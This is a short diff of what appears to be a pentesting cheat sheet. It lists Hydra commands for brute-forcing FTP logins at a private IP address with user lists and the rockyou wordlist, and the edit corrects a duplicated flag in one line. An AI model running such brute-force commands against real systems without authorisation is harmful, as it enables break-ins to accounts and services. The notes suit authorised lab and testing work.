@@ -4,7 +4,7 @@ If username is already given = hydra -l samson -P -P /usr/share/wordlists/rockyo
 
 If password is given and needs to find username = hydra -L user.txt -p 123 192.168.1.101 ftp
 
-If both username and password is not given = hydra -L user.txt -P -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp
+If both username and password is not given = hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp
 
 Reference = https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/
 
